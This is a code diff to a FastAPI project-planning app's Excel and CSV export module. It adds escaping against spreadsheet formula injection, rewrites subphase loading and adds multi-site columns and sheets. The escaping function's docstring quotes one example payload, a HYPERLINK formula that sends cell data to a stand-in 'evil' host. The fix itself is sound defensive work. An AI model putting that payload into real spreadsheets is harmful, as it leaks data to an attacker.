@@ -17,25 +17,48 @@ from typing import Any
 
 from fastapi import APIRouter, Depends, HTTPException
 from fastapi.responses import Response
-from sqlalchemy import select
+from sqlalchemy import exists, or_, select
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import selectinload
 
 from app.database import get_db
 from app.middleware.auth import require_superuser
+from app.models.absence_type import AbsenceType
 from app.models.card_comment import CardComment
 from app.models.custom_column import CustomColumn, CustomColumnValue
-from app.models.equipment import Equipment, EquipmentBlock
+from app.models.equipment import Equipment, EquipmentBlock, EquipmentSite
 from app.models.note import Note
 from app.models.project import Project, ProjectPhase, ProjectSubphase
-from app.models.site import BankHoliday, CompanyEvent, Site
+from app.models.site import BankHoliday, CompanyEvent, CompanyEventSite, Site
 from app.models.skill import Skill, UserSkill
-from app.models.tag import Tag
+from app.models.tag import Tag, TagGroup, TagSite
 from app.models.user import User, UserSite
 from app.models.vacation import Vacation
 from app.utils import utcnow_naive
 
 router = APIRouter(tags=["export"])
+
+
+# Leading characters that make Excel / LibreOffice / Sheets treat a cell as a
+# formula (or DDE payload). Tab and CR are included per OWASP's CSV-injection
+# guidance.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _safe_cell(value: Any) -> Any:
+    """
+    Neutralise spreadsheet formula injection in a user-controlled cell value.
+
+    Names, notes, comments and descriptions are free text from any user; a
+    value such as ``=HYPERLINK("http://evil/?"&A1,"open")`` would otherwise be
+    written as a live formula (openpyxl types any string starting with ``=``
+    as one) or evaluated when a CSV is opened. Strings starting with a
+    trigger character get a leading single quote; every other value --
+    numbers, dates, None -- is returned untouched.
+    """
+    if isinstance(value, str) and value.startswith(_FORMULA_TRIGGERS):
+        return "'" + value
+    return value
 
 
 def calculate_duration_days(start_date: date, end_date: date) -> int:
@@ -56,43 +79,48 @@ def format_date_for_export(d: date) -> str:
 
 
 async def get_project_with_hierarchy(db: AsyncSession, project_id: int) -> Project | None:
-    """Load project with all phases and subphases."""
+    """
+    Load a project with its manager, phases and the whole subphase tree.
+
+    Two queries: the project (+ manager, phases), then every subphase of the
+    project in one go; the tree is assembled in memory. Each phase gets a
+    ``subphases`` list and each subphase a ``children`` list (plain
+    attributes the task-list builders read). Subphases unreachable from a
+    phase (orphans of an old phase delete) are left out, and a parent cycle
+    in bad data cannot recurse forever.
+    """
     result = await db.execute(
-        select(Project).options(selectinload(Project.phases)).where(Project.id == project_id)
+        select(Project)
+        .options(selectinload(Project.phases), selectinload(Project.project_manager))
+        .where(Project.id == project_id)
     )
     project = result.scalar_one_or_none()
 
     if not project:
         return None
 
-    # Load subphases for each phase
-    for phase in project.phases:
-        subphases_result = await db.execute(
-            select(ProjectSubphase)
-            .where(ProjectSubphase.parent_id == phase.id, ProjectSubphase.parent_type == "phase")
-            .order_by(ProjectSubphase.sort_order)
-        )
-        phase.subphases = list(subphases_result.scalars().all())
+    subphases_result = await db.execute(
+        select(ProjectSubphase)
+        .where(ProjectSubphase.project_id == project_id)
+        .order_by(ProjectSubphase.sort_order, ProjectSubphase.id)
+    )
+    by_parent: dict[tuple[str, int], list[ProjectSubphase]] = {}
+    for sp in subphases_result.scalars().all():
+        by_parent.setdefault((sp.parent_type, sp.parent_id), []).append(sp)
 
-        # Recursively load nested subphases
-        await load_nested_subphases(db, phase.subphases)
+    seen: set[int] = set()
+
+    def attach(children: list[ProjectSubphase]) -> list[ProjectSubphase]:
+        kept = [c for c in children if c.id not in seen]
+        seen.update(c.id for c in kept)
+        for child in kept:
+            child.children = attach(by_parent.get(("subphase", child.id), []))  # type: ignore[attr-defined]
+        return kept
+
+    for phase in project.phases:
+        phase.subphases = attach(by_parent.get(("phase", phase.id), []))  # type: ignore[attr-defined]
 
     return project
-
-
-async def load_nested_subphases(db: AsyncSession, subphases: list[ProjectSubphase]):
-    """Recursively load children of subphases."""
-    for subphase in subphases:
-        result = await db.execute(
-            select(ProjectSubphase)
-            .where(
-                ProjectSubphase.parent_id == subphase.id, ProjectSubphase.parent_type == "subphase"
-            )
-            .order_by(ProjectSubphase.sort_order)
-        )
-        subphase.children = list(result.scalars().all())
-        if subphase.children:
-            await load_nested_subphases(db, subphase.children)
 
 
 def build_task_list(project: Project) -> list[dict[str, Any]]:
@@ -104,8 +132,8 @@ def build_task_list(project: Project) -> list[dict[str, Any]]:
     project_notes = []
     if project.customer:
         project_notes.append(f"Customer: {project.customer}")
-    if hasattr(project, "pm") and project.pm:
-        project_notes.append(f"PM: {project.pm.name}")
+    if project.project_manager:
+        project_notes.append(f"PM: {project.project_manager.full_name}")
 
     tasks.append(
         {
@@ -238,10 +266,11 @@ def generate_csv(tasks: list[dict[str, Any]], project_name: str) -> str:
         ]
     )
 
-    # Data rows
+    # Data rows (every cell through _safe_cell: names/notes are user text)
     for task in tasks:
         writer.writerow(
-            [
+            _safe_cell(cell)
+            for cell in [
                 task["id"],
                 task["name"],
                 task["outline_level"],
@@ -488,11 +517,14 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
     )
     project_ids = [p.id for p in project_rows]
 
-    # Equipment on this site
+    # Equipment linked to this site (equipment can be shared by several sites)
     equipment_rows = (
         (
             await db.execute(
-                select(Equipment).where(Equipment.site_id == site_id).order_by(Equipment.name)
+                select(Equipment)
+                .join(EquipmentSite, EquipmentSite.equipment_id == Equipment.id)
+                .where(EquipmentSite.site_id == site_id)
+                .order_by(Equipment.name)
             )
         )
         .scalars()
@@ -527,8 +559,38 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
     skill_by_id = {s.id: s for s in skill_rows}
     user_by_id = {u.id: u for u in user_rows}
 
-    # Tags are global - include all of them; per-project assignments come from Project.tags
-    tag_rows = (await db.execute(select(Tag).order_by(Tag.name))).scalars().all()
+    # Tags applicable to this site (available everywhere or restricted to it, among
+    # others), plus every tag group; per-project assignments come from Project.tags
+    tag_rows = (
+        (
+            await db.execute(
+                select(Tag)
+                .where(
+                    or_(
+                        Tag.all_sites.is_(True),
+                        exists().where(TagSite.tag_id == Tag.id, TagSite.site_id == site_id),
+                    )
+                )
+                .order_by(Tag.sort_order, Tag.name)
+            )
+        )
+        .scalars()
+        .all()
+    )
+    tag_group_rows = (
+        (await db.execute(select(TagGroup).order_by(TagGroup.sort_order, TagGroup.id)))
+        .scalars()
+        .all()
+    )
+    tag_group_names = {g.id: g.name for g in tag_group_rows}
+
+    # Absence types are global - include all of them (vacations reference them)
+    absence_type_rows = (
+        (await db.execute(select(AbsenceType).order_by(AbsenceType.sort_order, AbsenceType.id)))
+        .scalars()
+        .all()
+    )
+    absence_type_by_id = {t.id: t for t in absence_type_rows}
 
     # Vacations for users belonging to this site
     vacation_rows: list[Vacation] = []
@@ -589,17 +651,30 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
         .scalars()
         .all()
     )
+    # Company events linked to this site (events can span several sites)
     event_rows = (
         (
             await db.execute(
                 select(CompanyEvent)
-                .where(CompanyEvent.site_id == site_id)
-                .order_by(CompanyEvent.date)
+                .join(CompanyEventSite, CompanyEventSite.event_id == CompanyEvent.id)
+                .where(CompanyEventSite.site_id == site_id)
+                .order_by(CompanyEvent.date, CompanyEvent.id)
             )
         )
         .scalars()
         .all()
     )
+    # Names of every site each event is linked to, for the "Sites" column
+    event_site_names: dict[int, list[str]] = {}
+    if event_rows:
+        link_rows = await db.execute(
+            select(CompanyEventSite.event_id, Site.name)
+            .join(Site, Site.id == CompanyEventSite.site_id)
+            .where(CompanyEventSite.event_id.in_([e.id for e in event_rows]))
+            .order_by(Site.name)
+        )
+        for row in link_rows:
+            event_site_names.setdefault(row.event_id, []).append(row.name)
     note_rows = (
         (await db.execute(select(Note).where(Note.site_id == site_id).order_by(Note.date)))
         .scalars()
@@ -632,12 +707,14 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
 
     def add_sheet(title: str, headers: list[str], rows: list[list[Any]]) -> None:
         ws = wb.create_sheet(title=title[:31])  # Excel sheet name max 31 chars
-        ws.append(headers)
+        ws.append([_safe_cell(h) for h in headers])
         for cell in ws[1]:
             cell.font = header_font
             cell.fill = header_fill
         for row in rows:
-            ws.append(row)
+            # Every workbook cell goes through here: escape user text so it
+            # can never be stored as a formula.
+            ws.append([_safe_cell(v) for v in row])
         # Auto-size columns based on content (capped)
         for idx, header in enumerate(headers, start=1):
             max_len = len(str(header))
@@ -844,9 +921,17 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
     # Equipment
     add_sheet(
         "Equipment",
-        ["ID", "Name", "Type", "Description", "Active", "Created at"],
+        ["ID", "Name", "Type", "Description", "Active", "Sites", "Created at"],
         [
-            [e.id, e.name, e.type, e.description, _yes_no(e.active), _iso(e.created_at)]
+            [
+                e.id,
+                e.name,
+                e.type,
+                e.description,
+                _yes_no(e.active),
+                ", ".join(s.name for s in e.sites),
+                _iso(e.created_at),
+            ]
             for e in equipment_rows
         ],
     )
@@ -873,23 +958,78 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
         ],
     )
 
-    # Tags (global) and per-project tag assignments
+    # Tags applicable to the site, tag groups, and per-project tag assignments
     add_sheet(
         "Tags",
-        ["ID", "Name", "Color", "Created at"],
-        [[t.id, t.name, t.color, _iso(t.created_at)] for t in tag_rows],
+        ["ID", "Name", "Color", "Group", "All sites", "Sites", "Sort order", "Created at"],
+        [
+            [
+                t.id,
+                t.name,
+                t.color,
+                tag_group_names.get(t.group_id, "") if t.group_id is not None else "",
+                bool(t.all_sites),
+                "" if t.all_sites else ", ".join(s.name for s in t.sites),
+                t.sort_order,
+                _iso(t.created_at),
+            ]
+            for t in tag_rows
+        ],
     )
-    project_tag_rows = [[p.id, p.name, t.id, t.name, t.color] for p in project_rows for t in p.tags]
+    add_sheet(
+        "Tag groups",
+        ["ID", "Name", "Single select", "Sort order"],
+        [[g.id, g.name, bool(g.single_select), g.sort_order] for g in tag_group_rows],
+    )
+    project_tag_rows = [
+        [
+            p.id,
+            p.name,
+            t.id,
+            t.name,
+            t.color,
+            tag_group_names.get(t.group_id, "") if t.group_id is not None else "",
+        ]
+        for p in project_rows
+        for t in p.tags
+    ]
     add_sheet(
         "Project tags",
-        ["Project ID", "Project name", "Tag ID", "Tag name", "Tag color"],
+        ["Project ID", "Project name", "Tag ID", "Tag name", "Tag color", "Group"],
         project_tag_rows,
+    )
+
+    # Absence types (global)
+    add_sheet(
+        "Absence types",
+        ["ID", "Name", "Color", "Counts as unavailable", "Sort order", "Active"],
+        [
+            [
+                t.id,
+                t.name,
+                t.color,
+                _yes_no(t.counts_as_unavailable),
+                t.sort_order,
+                _yes_no(t.is_active),
+            ]
+            for t in absence_type_rows
+        ],
     )
 
     # Vacations
     add_sheet(
         "Vacations",
-        ["ID", "Staff ID", "Staff name", "Start date", "End date", "Description", "Created at"],
+        [
+            "ID",
+            "Staff ID",
+            "Staff name",
+            "Start date",
+            "End date",
+            "Description",
+            "Type ID",
+            "Type",
+            "Created at",
+        ],
         [
             [
                 v.id,
@@ -898,6 +1038,10 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
                 _iso(v.start_date),
                 _iso(v.end_date),
                 v.description,
+                v.absence_type_id or "",
+                absence_type_by_id[v.absence_type_id].name
+                if v.absence_type_id in absence_type_by_id
+                else "",
                 _iso(v.created_at),
             ]
             for v in vacation_rows
@@ -1123,9 +1267,18 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
     # Company events
     add_sheet(
         "Company events",
-        ["ID", "Date", "End date", "Name", "Color", "Created at"],
+        ["ID", "Date", "End date", "Name", "Color", "Sites", "Staff unavailable", "Created at"],
         [
-            [e.id, _iso(e.date), _iso(e.end_date), e.name, e.color or "", _iso(e.created_at)]
+            [
+                e.id,
+                _iso(e.date),
+                _iso(e.end_date),
+                e.name,
+                e.color or "",
+                ", ".join(event_site_names.get(e.id, [])),
+                _yes_no(e.counts_as_unavailable),
+                _iso(e.created_at),
+            ]
             for e in event_rows
         ],
     )
